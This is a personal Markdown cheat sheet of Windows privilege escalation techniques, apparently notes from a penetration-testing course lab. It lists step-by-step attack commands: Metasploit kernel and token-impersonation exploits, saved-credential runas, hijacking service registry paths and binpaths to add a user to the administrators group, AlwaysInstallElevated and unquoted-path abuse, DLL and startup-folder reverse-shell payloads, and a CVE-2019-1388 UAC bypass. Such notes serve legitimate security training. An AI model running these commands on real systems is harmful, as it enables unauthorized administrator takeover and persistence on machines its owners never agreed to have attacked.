# Priv Esc Sheet
## Links from tcm-sec
https://fuzzysecurity.com/tutorials/16.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


### https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources


# EXPLOITS

## KERNEL EXPLOIT

### using msfconsole
https://github.com/SecWiki/windows-kernel-exploits
1. meterpreter  -> run post/multi/recon/local_exploit_suggester
2.  if kitrapod is there use it or else look on the exploits suggested by msf
3.  use exploit/windows/local/ms10_015_kitrap0d
4.  set options 
5.  run 
6.  get shell 

### Manual 
1. ./windows-exploit-suggester.py --update 
2. convert the xls file to xlsx and then again to xls for this shit to work
3. do  "systeminfo" on the victim machine copy it to attack machine 
4. ./windows-exploit-suggester.py --database xlsFlie --systeminfo sysInfoFile
5. and the look through the results

## Windows subsystem for linux

1. dir "wsl.exe" /s
2. cd to dir
3. wsl.exe whoami
4. dir "bash.exe" /s
5. cd to dir 
6. do bash.exe 
7. get the tty shell 
8. do linux privesc

## Potato Attack
1. whoami /priv -> SeImpersonatePrivilege        Impersonate a client after authentication   **Enabled**
2. msfconsole
3. use exploit/multi/script/web_delivery
4. set options 
5. set target with pwrshell if python not present
6. change payload if it is not working
7. copy the generated code and paste it in the window shell
8. we will get a connection
9. do sysinfo
10. background
11. use post/multi/recon/local_exploit_suggester to look for exploits ```ms_16_075_reflection``` or ```ms_16_075_reflection_juicy```
12. following steps are only for reflection and not reflection_juicy, we can get a system shell directly from juicy
14. if the meterpreter shell is x86 and system is x64
15. do ps
16. migrate to any service or process running on x64
17. do sessions to check if there is a x64 meterpreter shell
18. now use exploit/windows/local/scripts/ms16_075_reflection
19. set options
20. run ->get a new meterpreter shell
21. do load incognito
22. list_tokens -u
23. impersonate_token "Token Name"
24. done

## RunAs escalation
1. cmdkey /list
2. C:\Windows\System32\runas.exe /user:User /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"

## Registry Escalation

### Auto Run
1. C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
2. Look for progs with path as  "C:\Program Files\Autorun Program"
3. then in cmd do C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
4. We are looking for something like this

![image](https://user-images.githubusercontent.com/115465242/201464618-c9d8ba37-15bb-4631-9478-35e53048735b.png)

5. **OR WE CAN USE powerup.ps1**
    1. powershell -ep bypass
    2. . .\PowerUp.ps1
    3. Invoke-AllChecks
    4. there we can find the same from above

6. use msfvenom to get a windows/meterpreter/reverse_shell payload with the same name as that of program
7. configure msfconsole to start a listener
8.  put the payload in the location 
9.  Ideally the payload should get run by it self if the auth system logs in.

### AlwaysInstallElevated
1. reg query HKLM\Software\Policies\Microsoft\Windows\Installer

![image](https://user-images.githubusercontent.com/115465242/201473227-3cb88387-e3b0-42f6-a98a-d1f8a47220f3.png)

2. We are looking for something like this\!
3. if we run powerup.ps1 and get Write-UserAddMSI as vuln 
4. type Write-UserAddMSI is powershell and we will get a setup if we run that 
5. a user with administrative privileges will be made with a given pass, we can switch to that user and use it as admin

**OR**

1. We can make a .msi payload through msfvenom and start a listener
2. Rather than saving the file straight up run the payload it should get installed and run as Authority

**OR**
1. we can use exploit/windows/local/always_install_elevated
 
 ## Service Escalation - Registry
 1. Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
 2. We are looking for something like this

![image](https://user-images.githubusercontent.com/115465242/201506805-2487d212-2f8b-458b-a53a-5f3c6067a73b.png)

 3. now on attack machine we have windows_service.c 
 4. gedit that
 5. add this to system() -> cmd.exe /k net localgroup administrators **username** /add
 6. compile it using ->  x86_64-w64-mingw32-gcc windows_service.c -o x.exe
 7. using ftp or http transfer to attack machine and then move it to C:\Temp
 8. then through cmd do ->  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
 9. do sc start regsvc 
 10. net localgroup administrators -> user as administrator 


**NOTE**: cmd on 9th will only work on a cmd shell and not powershell


## Executeable Files
Download accesschk64.exe put in C:\Users\User\Desktop\Tools<br>
1. C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

2. We are looking for something like this
![image](https://user-images.githubusercontent.com/115465242/201575835-835e4ed1-03db-45cc-bb3f-224085539175.png)

3. we can also run powerup to get the same results

![image](https://user-images.githubusercontent.com/115465242/201576163-0b6872a2-e5ae-4dac-886a-f353b12621be.png)

4. Follow step 4-6 from **Service Escalation - Registry** 
5. transfer it to the vuln path with same name as vuln process
6. net localgroup administrators
7. sc start servicename
8. net localgroup administrators

## Startup Applications Overview
DOWNLOAD icacls.exe save in ~/Desktop/tools, transfer to windows victim machine.<br>
1.  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
2.  We are looking for \<F\>
![image](https://user-images.githubusercontent.com/115465242/201578426-2225f4af-afdc-43a7-aeec-509dacc4189c.png)
3. Generate a windows/meterpreter/reverse_tcp , .exe payload 
4. wait for the some admin to log in

# DLL Hijacking 

1. Using powersploit or winPEAS check if there a service or prog with some dll not found

**NOTE: NOT CORRECT ANSWER but will do for now**
1. USE Procmon's filter to get NAME NOT FOUND for Process name ending with .dll
2. Check if the list have any path that is a writeable path 
3. make a malicious .dll file put it in that folder
4. set up the reverse listener
5. restart the service


**NOTE: from step 2 its correct answer only the STEP 1 is wrong as to use procmon we need admin privs and thus the first  step is only for simulation purpose and will not work in real life pentest**

# Escalation via Binary Paths 
1. use powerup.ps1
2. Invoke-AllChecks
3. We wil see **checking service permission**
4. Then we can use acesschk.exe 
5. accesschk.exe -uwcv Everyone *
![image](https://user-images.githubusercontent.com/115465242/208906463-e48f8ef2-907b-4514-8a23-3cb7024150c8.png)

6. accesschk.exe -uwcv service_name
![image](https://user-images.githubusercontent.com/115465242/208906739-c00b193c-5935-4599-9906-a18a0cb03a01.png)

7. **sc qc service_name** will give us the path from where the service is being called.
8. all we have to do now is to configure the service to our advantage.
9. config service_name binpath= "net localgroup administrators user_name /add"
10. sc start service_name

# Escalation via Unquoted Service Path
1. use powerup.ps1
2. Invoke-AllChecks
![image](https://user-images.githubusercontent.com/115465242/208908310-0d66b6d9-65bb-4df1-9542-49445ab18749.png)

3. Now if we got a unqouted path, to find a program windows will search something like this
4. lets say path is C:\Windows\Vikalp Parashar\Unqouted Service\service.exe
5. then C:\Windows\Vikalp.exe -->then C:\Windows\Vikalp Parashar.exe -->C:\Windows\Vikalp Parashar\Unqouted.exe -->C:\Windows\Vikalp Parashar\Unqouted Service.exe -->C:\Windows\Vikalp Parashar\Unqouted Service\service.exe
6. Also the service should auto run as Authority!
![image](https://user-images.githubusercontent.com/115465242/208910185-f6a2c9f2-3945-4148-904b-ff0070e6db10.png)

7. So We can use this our advantage
8. We can make a malicious payload by the name Vikalp.exe and save it to C:\Windows\Vikalp Parashar\ 
9. Now just start the service and payload executed
10. sc start service_name 

# CVE-2019-1388
1. we need hhupd and we need to run it as an administrator
![image](https://user-images.githubusercontent.com/115465242/209417837-7323345a-f4ca-465b-b4a6-f6f02e2bc1f9.png)

2. We click to see more details about publisher certificate
![image](https://user-images.githubusercontent.com/115465242/209417878-e534d6f5-348c-4b9d-9611-917de49e22e7.png)

3. We click on the link of the certificate and then back out of everything, we will find an internet explorer opened for us 
![image](https://user-images.githubusercontent.com/115465242/209417913-a31438bb-755b-4127-844f-667a5bcb090a.png)
![image](https://user-images.githubusercontent.com/115465242/209417945-ed2cc03c-ae85-4480-bc07-1b171d3b7588.png)

4.  go to setting and save and ignore errors
![image](https://user-images.githubusercontent.com/115465242/209417960-be716e99-1c47-4666-8ae7-31764c372324.png)

5. instead of the name of the file type this ==> C:\Windows\System32\*.* and then search for cmd and just open it
6. cmd will run as administrator
![image](https://user-images.githubusercontent.com/115465242/209418030-a792c7a7-566f-4bd3-ba6b-ed3ec2db4d54.png)

  
